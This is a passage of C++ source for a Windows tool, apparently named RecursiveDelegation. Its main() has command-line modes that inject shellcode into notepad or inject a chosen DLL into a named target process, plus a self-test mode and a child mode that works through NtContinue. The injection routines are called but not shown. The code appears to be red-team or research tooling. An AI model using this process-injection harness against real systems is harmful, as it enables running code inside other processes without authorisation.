	//HANDLE hFileMapping = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, 4096, "RecursiveDelegationSharedMemSection");
	//if (hFileMapping == NULL) {
	//	std::cerr << "main: CRITICAL - Failed to create file mapping. Error: " << GetLastError() << std::endl;
	//	return 1;
	//}
	//void* pSharedSection = MapViewOfFile(hFileMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0);
    //if (pSharedSection) {
    //    DEBUG_COUT("main: Shared memory section created successfully." << std::endl);
    //    g_pSharedSection = pSharedSection;
    //}
    //else {
    //    std::cerr << "main: Warning - Failed to map shared memory section.Error: " << GetLastError() << std::endl << "Remember delegated process has its own memory VA." << std::endl;
    //}

    if (!pNtContinue || !pExitThread) {
        std::cerr << "main: CRITICAL - Failed to resolve NtContinue or ExitThread. Error: "
            << (!pNtContinue ? "NtContinue " : "") << (!pExitThread ? "ExitThread " : "")
            << GetLastError() << std::endl;
        return 1;
    }
    DEBUG_PRINTF("main: NtContinue at %p, ExitThread at %p, pAsmStub at %p\n", (void*)pNtContinue, (void*)pExitThread, (void*)pAsmStub);



    // Distinguish parent-mode CLI flags ("--foo") from child-mode args.
    // Child cmdline shape: <exe> <level-int> <Module!Function> <pipeName> [exitFunc].
    bool isChildMode = (argc >= 4) && (strchr(argv[2], '!') != nullptr);

    if (isChildMode) {
        DEBUG_COUT("main: Detected child mode." << std::endl);
        char* cmdLine = GetCommandLineA();
        DEBUG_COUT("main: Command line for child: " << cmdLine << std::endl);
        return ProcessChildMode(argc, argv, pNtContinue) ? 0 : 1;
    }

    // Parent-mode CLI flags for scripted / unattended runs (no cin.get() blocks).
    if (argc > 1) {
        std::string flag = argv[1];
        if (flag == "--inject-notepad") {
            int level = (argc >= 3) ? atoi(argv[2]) : recursiveDelegationLevel;
            return InjectShellcodeToNotepadTest(level);
        }
        if (flag == "--inject-dll") {
            if (argc < 5) {
                std::cerr << "Usage: RecursiveDelegation.exe --inject-dll <level> <dll_path> <process_name>" << std::endl;
                std::cerr << "Example: RecursiveDelegation.exe --inject-dll 2 \"C:\\path\\to\\my.dll\" notepad.exe" << std::endl;
                return 1;
            }
            int level = atoi(argv[2]);
            const char* dllPath = argv[3];
            const char* targetProcess = argv[4];
            return InjectDllToProcess(level, dllPath, targetProcess);
        }
        if (flag == "--selftest") {
            RunAllDelegationTests();
            return 0;
        }
        std::cerr << "Unknown flag: " << flag << std::endl;
        std::cerr << "Usage: RecursiveDelegation.exe [--selftest|--inject-notepad [level]|--inject-dll <level> <dll_path> <process_name>]" << std::endl;
        return 1;
    }

    // ---- Parent Process Logic ----
    DEBUG_COUT("main: Detected parent mode." << std::endl);

    RunAllDelegationTests();
    std::cin.get(); // Wait for user input before exiting

    InjectDllToProcess(recursiveDelegationLevel, "C:\\path\\to\\your.dll", "notepad.exe");
    std::cin.get(); // Wait for user input before exiting

    InjectShellcodeToNotepadTest(recursiveDelegationLevel);
	std::cin.get(); // Wait for user input before exiting

    return 0;
}
